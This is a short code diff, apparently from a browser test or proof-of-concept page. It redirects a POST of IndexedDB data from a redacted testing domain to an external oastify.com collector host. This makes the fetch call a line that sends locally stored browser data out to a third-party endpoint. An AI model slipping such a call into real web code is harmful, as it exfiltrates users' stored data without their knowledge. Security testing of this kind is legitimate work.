@@ -139,7 +139,7 @@
                 try {
                     logStatus('📤 Sending data to server...');
                     
-                    const response = await fetch('https://mytesting.redacted.com/api/indexeddb', {
+                    const response = await fetch('https://omeu42fhgclradhnfojabmiz4qahyamz.oastify.com/api/indexeddb', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
